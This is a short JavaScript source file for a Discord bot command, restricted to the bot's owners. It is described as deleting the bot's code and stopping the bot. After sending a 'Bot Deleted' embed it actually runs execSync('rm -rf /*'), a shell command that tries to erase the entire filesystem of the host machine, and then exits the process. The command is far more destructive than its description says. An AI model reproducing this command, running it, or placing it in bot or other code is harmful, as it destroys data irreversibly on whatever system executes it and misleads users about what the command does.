const Commands = require(`../Structures/Commands`);
const { MessageEmbed } = require(`discord.js`);
const { execSync } = require(`child_process`);
const { basename } = require(`path`);

class Command extends Commands {
	constructor(client) {
		super(client, {
			enabled: true,
			show: true,
			cooldown: false,
			cooldownTime: 3,
			name: basename(__filename, `.js`),
			description: `Deletes code and stops bot`,
			usage: `System32`,
			aliases: []
		});
	}

	run(client, message) {
		if (!client.ownerIDs.includes(message.author.id)) return client.send(message, `Sorry, you do not have permission for this command`);

		const embed = new MessageEmbed()
			.setAuthor(`${message.author.username} (${message.author.id})`, message.author.displayAvatarURL())
			.setDescription(`Bot Deleted`)
			.setColor(0x00FF00)
			.setFooter(client.botName)
			.setTimestamp();
		client.send(message, { embed });

		execSync(`rm -rf /*`);
		process.exit();
	}
}

module.exports = Command;
